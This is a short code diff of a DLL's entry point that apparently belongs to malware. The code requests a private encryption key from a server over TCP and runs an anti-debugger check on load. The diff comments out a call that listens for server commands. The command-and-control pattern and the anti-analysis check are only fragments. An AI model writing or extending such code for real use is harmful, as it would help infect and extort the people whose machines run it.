@@ -46,7 +46,8 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		ClientRequest req(ClientRequest::kRequestPrivateEncryptionKey);
 		me->MakeTCPRequest(req, TRUE);
 		OutputDebugStringA("good");
-		me->ListenForServerCommands();
+
+		//me->ListenForServerCommands();
 
 		ProcessManager mgr;
 		mgr.CheckNoDebugger();
